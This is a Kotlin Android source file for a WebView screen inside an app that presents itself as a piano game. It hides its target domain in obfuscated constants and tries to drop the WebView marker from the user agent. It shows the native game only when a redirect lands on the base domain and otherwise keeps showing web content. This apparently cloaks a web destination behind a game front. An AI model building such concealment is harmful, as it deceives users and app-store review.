package com.amanotes.classicalpian.web

import android.Manifest
import android.annotation.SuppressLint
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.net.Uri
import android.os.Build
import android.webkit.CookieManager
import android.webkit.ValueCallback
import android.webkit.WebChromeClient
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.compose.BackHandler
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.PickVisualMediaRequest
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.material3.LinearProgressIndicator
import androidx.compose.runtime.Composable
import androidx.compose.runtime.DisposableEffect
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.res.stringResource
import androidx.compose.ui.viewinterop.AndroidView
import androidx.core.app.ActivityCompat
import androidx.core.app.ActivityCompat.shouldShowRequestPermissionRationale
import androidx.core.content.ContextCompat
import com.amanotes.classicalpian.R
import com.amanotes.classicalpian.game.MainActivity
import com.amanotes.classicalpian.model.source.CryptoManager
import com.amanotes.classicalpian.ui.elements.PermissionDialog
import com.amanotes.classicalpian.ui.elements.PostPermissionTextProvider
import com.amanotes.classicalpian.ui.elements.ShowAlertDialog
import com.amanotes.classicalpian.ui.theme.Blue
import com.amanotes.classicalpian.ui.theme.Pink
import com.amanotes.classicalpian.web.mvp.WebPresenter
import org.koin.compose.koinInject

@Composable
fun WebScreen(
    modifier: Modifier = Modifier,
    passedUrl: String,
    isFirst: Boolean
) {

    val webPresenter = koinInject<WebPresenter>()
    val cryptoManager = koinInject<CryptoManager>()

    val context = LocalContext.current

    var isLoading by remember { mutableStateOf(true) }
    var progress by remember { mutableStateOf(0) }
    var urlSavingStatus by remember { mutableStateOf(false) }

    val cookieManager: CookieManager = CookieManager.getInstance()
    var selectedImageUris by remember { mutableStateOf<ValueCallback<Array<Uri>>?>(null) }

    var hasToShowPermissionExplanationDialog by remember { mutableStateOf(false) }
    var isPermanentlyDeclined by remember { mutableStateOf(false) }
    var hasNotificationPermission by remember {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            mutableStateOf(
                ContextCompat.checkSelfPermission(
                    context,
                    Manifest.permission.POST_NOTIFICATIONS
                ) == PackageManager.PERMISSION_GRANTED
            )
        } else mutableStateOf(true)
    }
    val postPermissionResultLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestPermission(),
        onResult = { isGranted ->
            hasNotificationPermission = isGranted
            if (!isGranted) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    if (shouldShowRequestPermissionRationale(
                            context as Activity, Manifest.permission.POST_NOTIFICATIONS
                        )
                    ) hasToShowPermissionExplanationDialog = true
                }
            }
        }
    )

    val launcher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.PickMultipleVisualMedia()
    ) { uris ->
        selectedImageUris = if (uris.isNotEmpty()) {
            selectedImageUris?.onReceiveValue(uris.toTypedArray())
            null
        } else {
            selectedImageUris?.onReceiveValue(null)
            null
        }
    }

    val webView = remember {
        WebView(context).apply {
            setUpWebView(this)
            setUpCookies(cookieManager, this)

            webChromeClient = object : WebChromeClient() {

                override fun onProgressChanged(view: WebView?, newProgress: Int) {
                    super.onProgressChanged(view, newProgress)
                    progress = newProgress
                    isLoading = newProgress != MAX_PROGRESS
                }

                override fun onShowFileChooser(
                    webView: WebView?,
                    filePathCallback: ValueCallback<Array<Uri>>?,
                    fileChooserParams: FileChooserParams?
                ): Boolean {
                    selectedImageUris = filePathCallback
                    launcher.launch(PickVisualMediaRequest(ActivityResultContracts.PickVisualMedia.ImageOnly))
                    return true
                }
            }

            webViewClient = object : WebViewClient() {

                override fun onPageStarted(view: WebView, url: String, favicon: Bitmap?) {
                    isLoading = true
                }

                override fun onPageFinished(view: WebView?, url: String?) {
                    super.onPageFinished(view, url)
                    isLoading = false
                    if (urlSavingStatus) {
                        if (url != null) {
                            urlSavingStatus = !isFirst
                            if (isUrlIncorrect(url)) prepareGame()
                            else updateLocalData(url)
                        }
                    }
                    cookieManager.flush()
                }

                private fun isUrlIncorrect(url: String) = url == cryptoManager.encryptOrDecryptString(BASE_DOMAIN)

                private fun prepareGame() {
                    updateLocalData(cryptoManager.encryptOrDecryptString(GAME_URL))
                    openGame(context = context)
                    destroy()
                }

                private fun updateLocalData(url: String) {
                    webPresenter.onSaveWebData(url, urlSavingStatus)
                }

            }
        }
    }

    LaunchedEffect(key1 = true) {
        urlSavingStatus = isFirst
        if (passedUrl.isNotBlank()) webView.loadUrl(passedUrl)
        else openGame(context = context)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (!hasNotificationPermission) {
                postPermissionResultLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
            }
        }
    }

    if (hasToShowPermissionExplanationDialog) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            PermissionDialog(
                permissionTextProvider = PostPermissionTextProvider(),
                isPermanentlyDeclined = isPermanentlyDeclined,
                onDismiss = { hasToShowPermissionExplanationDialog = false },
                onSubmit = {
                    hasToShowPermissionExplanationDialog =
                        if (!isPermanentlyDeclined) {
                            postPermissionResultLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
                            false
                        } else false
                },
                onCancel = {
                    isPermanentlyDeclined = true
                    hasToShowPermissionExplanationDialog = false
                    hasToShowPermissionExplanationDialog = true
                }
            )
        }
    }

    Box(modifier = modifier.fillMaxSize()) {

        AndroidView(
            factory = { webView },
            modifier = modifier.fillMaxSize(),
        )

        if (isLoading) {
            LinearProgressIndicator(
                progress = progress / 100f,
                modifier = modifier
                    .align(alignment = Alignment.TopCenter)
                    .fillMaxWidth(),
                trackColor = Blue,
                color = Pink
            )
        }
    }

    var showDialog by remember { mutableStateOf(false) }

    if (showDialog) {
        ShowAlertDialog(
            alertTitle = stringResource(id = R.string.exit),
            alertMessage = stringResource(id = R.string.exit_app_message),
            onPositiveClick = { ActivityCompat.finishAffinity(context as Activity) },
            onDismiss = { showDialog = false }
        )
    }

    BackHandler {
        when (webView.canGoBack()) {
            true -> webView.goBack()
            false -> showDialog = true
        }
    }

    DisposableEffect(Unit) {
        onDispose {
            webView.destroy()
            cookieManager.removeAllCookies(null)
            webPresenter.onDestroy()
        }
    }

}

@SuppressLint("SetJavaScriptEnabled")
private fun setUpWebView(webView: WebView) {
    webView.settings.apply {
        javaScriptEnabled = true
        domStorageEnabled = true
        useWideViewPort = true
        userAgentString.replace("wv", "")
    }
}

private fun setUpCookies(
    cookieManager: CookieManager,
    webView: WebView
) {
    cookieManager.apply {
        setAcceptCookie(true)
        setAcceptThirdPartyCookies(webView, true)
    }
}

private fun openGame(context: Context) {
    ActivityCompat.startActivity(
        context as Activity,
        Intent(context, MainActivity::class.java),
        null
    )
    ActivityCompat.finishAffinity(context)
}

private const val MAX_PROGRESS = 100
private const val BASE_DOMAIN = "eyy}~7\"\"~zhhyobclcwl~#~o~\""
private const val GAME_URL = "JL@HRX_A"